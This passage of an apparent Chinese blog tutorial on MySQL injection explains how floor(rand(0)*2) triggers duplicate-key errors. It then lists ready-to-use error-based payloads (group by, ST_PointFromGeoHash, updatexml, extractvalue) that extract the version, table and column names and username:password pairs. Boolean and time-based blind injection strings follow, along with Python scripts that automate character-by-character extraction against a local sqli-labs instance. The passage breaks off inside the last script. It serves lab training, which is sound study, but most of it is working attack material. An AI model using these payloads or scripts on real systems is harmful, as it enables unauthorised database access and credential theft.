建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span 